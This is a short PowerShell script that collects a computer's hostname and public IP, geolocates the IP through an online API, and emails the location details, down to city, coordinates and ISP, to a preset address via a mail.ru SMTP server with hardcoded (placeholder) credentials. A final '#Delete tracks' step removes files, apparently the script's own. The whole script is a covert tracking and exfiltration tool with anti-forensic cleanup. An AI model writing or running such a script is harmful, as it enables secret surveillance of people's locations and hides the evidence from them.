#Set hostname
$USERHOST=hostname
#Set email from
$EMAIL_FROM='test.test@test.com'
$EMAIL_FROM_PASS='test'
#Set email to
$EMAIL_TO='test.test@test.com'
#Get user public IP
$publicIP = Invoke-RestMethod http://ifconfig.me/ip
#IP2location API key
$apikey = "TTTTTTTTTTTTTTTTTTT"
#Get geolocation data
$uri = "https://api.ip2location.io/?key=$apikey&ip=$publicIP"
$response = Invoke-RestMethod -Uri $uri
$object = $response

#Get geolocation parameters
$ip = $object.ip
$country_code = $object.country_code
$country_name = $object.country_name
$region_name = $object.region_name
$city_name = $object.city_name
$latitude = $object.latitude
$longitude = $object.longitude
$latitude = $object.latitude
$zip_code = $object.zip_code
$time_zone = $object.time_zone
$as = $object.as
$is_proxy = $object.is_proxy

#Send email
Send-MailMessage -From "User geolocation <$EMAIL_FROM>" -To "<$EMAIL_TO>" -Subject "$USERHOST geolocation" -Body "$USERHOST geolocation =>`n`nIP: $ip `nCountry code: $country_code `nCountry name: $country_name `nRegion name: $region_name `nCity name: $city_name `nLatitude: $latitude `nLongitude: $longitude `nZIP code: $zip_code `nTime zone: $time_zone `nProvider: $as `nProxy: $is_proxy" -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$EMAIL_FROM", (ConvertTo-SecureString -String "$EMAIL_FROM_PASS" -AsPlainText -Force))

#Delete tracks
del gug*
exit
